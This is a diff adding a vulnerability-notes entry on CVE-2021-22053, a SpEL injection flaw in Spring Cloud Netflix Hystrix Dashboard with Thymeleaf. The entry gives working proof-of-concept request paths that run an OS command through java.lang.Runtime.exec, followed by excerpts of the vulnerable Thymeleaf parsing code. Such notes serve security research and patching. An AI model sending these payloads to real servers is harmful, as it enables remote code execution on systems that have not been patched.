@@ -273,4 +273,30 @@ SpelView
         };
     }
 ```
+## Spring Cloud Netflix Hystrix Dashboard + Spring Boot Thymeleaf
+### CVE-2021-22053 SpEL
+Affected Version: < 2.2.9.RELEASE   
+POC: 
+```
+GET /hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("open -a calculator")}__::.x/
 
+/hystrix/;a=a/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)%7D__::.x
+/hystrix;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)%7D__::.x/
+/hystrix/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)%7D__::.x/
+```
+Factor: 
+```
+org.thymeleaf.spring5.view.ThymeleafView
+protected void renderFragment(Set<String> markupSelectorsToRender, Map<String, ?> model, HttpServletRequest request, HttpServletResponse response) throws Exception {
+    IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);
+    FragmentExpression fragmentExpression;
+    try {
+        fragmentExpression = (FragmentExpression)parser.parseExpression(context, "~{" + viewTemplateName + "}");
+    }
+}
+org.thymeleaf.standard.expression.StandardExpressionParser
+static IStandardExpression parseExpression(IExpressionContext context, String input, boolean preprocess) {
+    IEngineConfiguration configuration = context.getConfiguration();
+    String preprocessedInput = preprocess ? StandardExpressionPreprocessor.preprocess(context, input) : input;
+}
+```
